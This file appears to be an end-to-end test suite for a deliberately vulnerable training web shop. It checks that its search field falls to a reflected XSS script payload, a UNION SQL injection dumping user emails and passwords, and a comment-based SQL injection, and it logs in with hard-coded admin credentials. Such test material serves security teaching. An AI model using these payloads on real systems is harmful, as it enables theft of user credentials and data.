'use strict';

describe('/#/search', function () {

    var searchQuery, searchButton;

    beforeEach(function () {
        browser.get('/#/search'); // not really necessary as search field is part of navbar on every dialog
        searchQuery = element(by.model('searchQuery'));
        searchButton = element(by.id('searchButton'));
    });

    describe('challenge "xss1"', function () {

        it('search query should be susceptible to reflected XSS attacks', function () {
            var EC = protractor.ExpectedConditions;

            searchQuery.sendKeys('<script>alert("XSS1")</script>');
            searchButton.click();
            browser.wait(EC.alertIsPresent(), 5000, "'XSS1' alert is not present");
            browser.switchTo().alert().then(function (alert) {
                expect(alert.getText()).toEqual('XSS1');
                alert.accept();
            });

        });

        protractor.expect.challengeSolved({challenge: 'xss1'});

    });

    describe('challenge "unionSqlI"', function () {

        it('search query should be susceptible to UNION SQL injection attacks', function () {
            searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null,null from users--');
            searchButton.click();

            var productDescriptions = element.all(by.repeater('product in products').column('description'));
            expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
        });

        protractor.expect.challengeSolved({challenge: 'unionSqlI'});

    });

    describe('challenge "christmasSpecial"', function () {
        protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});

        it('search query should reveal logically deleted christmas special product on SQL injection attack', function () {
            searchQuery.sendKeys('christmas%25\'))--');
            searchButton.click();

            var productNames = element.all(by.repeater('product in products').column('name'));
            expect(productNames.first().getText()).toMatch(/Christmas Super-Surprise-Box \(2014 Edition\)/);

            element(by.css('.fa-cart-plus')).element(by.xpath('ancestor::a')).click();

            browser.get('/#/basket');
            element(by.id('checkoutButton')).click();
        });

        protractor.expect.challengeSolved({challenge: 'christmasSpecial'});

    });

});